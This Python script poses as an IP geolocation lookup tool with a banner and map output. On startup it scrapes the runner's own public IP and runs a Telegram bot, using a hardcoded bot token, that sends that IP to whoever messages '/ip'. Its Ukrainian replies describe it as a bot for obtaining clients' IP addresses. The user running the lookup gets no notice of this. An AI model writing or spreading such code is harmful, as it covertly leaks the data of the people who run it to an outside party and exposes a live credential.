from pyfiglet import Figlet
import folium
import bs4
import requests
import time

s = requests.get('https://2ip.ua/ru/')

b = bs4.BeautifulSoup(s.text, "html.parser")

a = b.select(" .ipblockgradient .ip")[0].getText()

url = "https://api.telegram.org/bot6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8/"


def last_update(r):
    response = requests.get(r + "getUpdates")
    response = response.json()
    result = response['result']
    total_updates = len(result) - 1
    return result[total_updates]


def get_chat_id(u):
    chat_id = u['message']['chat']['id']
    return chat_id


def get_message_text(u):
    text = u['message']['text']
    return text


def send_message(chat, text):
    p = {'chat_id': chat, 'text': text}
    response = requests.post(url + 'sendMessage', params=p)
    return response


def get_info_by_ip(ip='127.0.0.1'):
    try:
        response = requests.get(url=f'http://ip-api.com/json/{ip}').json()
        # print(response)

        data = {
            '[IP]': response.get('query'),
            '[Int prov]': response.get('isp'),
            '[Org]': response.get('org'),
            '[Country]': response.get('country'),
            '[Region Name]': response.get('regionName'),
            '[City]': response.get('city'),
            '[ZIP]': response.get('zip'),
            '[Lat]': response.get('lat'),
            '[Lon]': response.get('lon'),
        }

        for k, v in data.items():
            print(f'{k} : {v}')

        area = folium.Map(location=[response.get('lat'), response.get('lon')])
        area.save(f'{response.get("query")}_{response.get("city")}.html')

    except requests.exceptions.ConnectionError:
        print('[!] Please check your connection!')


def main():
    preview_text = Figlet(font='slant')
    print(preview_text.renderText('IP INFO'))
    ip = input('Please enter a target IP: ')

    get_info_by_ip(ip=ip)
    # print("Bot started")
    up_id = last_update(url)['update_id']
    while True:
        upd = last_update(url)
        if up_id == upd['update_id']:
            # print("New message!")

            if get_message_text(upd).lower() == "/ip":
                send_message(get_chat_id(upd), f"IP клієнта: {a}")

            elif get_message_text(upd).lower() == "/start":
                send_message(get_chat_id(upd),
                             "Я Бот для отримання IP адресів клієнтів")



            elif get_message_text(upd).lower() == "/help":
                send_message(get_chat_id(upd),
                             "Я Бот для отримання IP адресів клієнтів")

            else:
                send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
            up_id += 1
        time.sleep(2)




if __name__ == '__main__':
    main()
